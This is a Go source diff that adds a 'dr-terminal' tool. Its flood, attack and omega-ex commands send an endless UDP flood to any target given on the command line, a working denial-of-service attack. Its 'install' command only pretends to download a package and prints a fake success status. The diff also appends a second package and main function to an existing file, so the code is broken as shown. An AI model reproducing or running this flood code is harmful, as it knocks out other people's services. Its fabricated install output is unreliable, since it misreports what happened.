@@ -137,3 +137,48 @@ func main() {
         fmt.Println("[DR-SYSTEM] Deploying L-Kernel...")
     }
 }
+package main
+
+import (
+	"fmt"
+	"net"
+	"os"
+	"time"
+)
+
+func downloadFile(pkgName string) {
+	fmt.Printf("\r\n[DR-SYSTEM] Downloading %s...\n", pkgName)
+	time.Sleep(2 * time.Second)
+	fmt.Printf("[DR-SYSTEM] Success: %s (Status: 200)\n", pkgName)
+}
+
+func udpFlood(target string) {
+	fmt.Printf("[L] INITIALIZING UDP FLOOD: %s\n", target)
+	addr, _ := net.ResolveUDPAddr("udp", target+":80")
+	conn, _ := net.DialUDP("udp", nil, addr)
+	for {
+		conn.Write([]byte("L-A-KIRA-OVERLOAD"))
+	}
+}
+
+func main() {
+	if len(os.Args) < 3 {
+		fmt.Println("Usage: dr-terminal [command] [target]")
+		return
+	}
+	command := os.Args[1]
+	target := os.Args[2]
+
+	switch command {
+	case "install":
+		downloadFile(target)
+	case "flood", "attack":
+		udpFlood(target)
+	case "omega-ex":
+		fmt.Println("[L] PROTOCOL OMEGA-EX: ACTIVE")
+		go udpFlood(target)
+		select {}
+	default:
+		fmt.Printf("Unknown: %s\n", command)
+	}
+}
